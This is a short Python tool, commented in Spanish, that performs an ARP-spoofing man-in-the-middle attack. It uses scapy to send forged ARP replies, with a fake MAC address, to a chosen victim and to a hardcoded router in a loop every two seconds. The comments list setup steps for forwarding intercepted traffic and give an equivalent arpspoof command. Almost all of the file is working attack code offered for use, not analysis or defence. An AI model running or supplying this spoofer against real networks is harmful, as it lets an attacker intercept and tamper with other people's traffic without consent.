#!/usr/bin/env python3

import argparse
import time
import scapy.all as scapy
from termcolor import colored
import signal
import sys

# Step 1: iptables --policy FORWARD ACCEPT
# Permitir aceptar paquetes entrantes para redirigirlos al destino

# Step 2: cat /proc/sys/net/ipv4/ip_forward
# Este archivo deve contener un "1", si no lo tiene editarlo y agregarlo. Solo debe tener un "1"

# Step 3: Debes cambiar la mac address con macchanger...

# --------------------------------------- #
# Para hacer el ataque de forma automatizada es de la siguiente manera:
# arpspoof -i ens33 -t 192.168.100.60 -r 192.168.100.1

def def_handler(sig, frame):
  print(colored(f"\n[!] Saliendo...\n"))
  sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

def getArguments():
  parser = argparse.ArgumentParser(description="ARP Spoofer MITM")
  parser.add_argument("-t", "--target", required=True, dest="ipAddress", help="Host / IP Range to Spoof")

  args = parser.parse_args()

  return args.ipAddress

def spoof(ipAddress, spoofIp):
  # Paquete ARP para el equipo victima...
  arpPacket = scapy.ARP(op=2, psrc=spoofIp, pdst=ipAddress, hwsrc="aa:bb:cc:44:55:66")
  scapy.send(arpPacket, verbose=False)

def main():
  ipAddress = getArguments()

  while True:
    # Paquete ARP para el equipo que se quiere interceptar...
    spoof(ipAddress, '192.168.100.1')
    # Paquete ARP para envenenar el router...
    spoof('192.168.100.1', ipAddress)
    time.sleep(2)

if __name__ == "__main__":
  main()
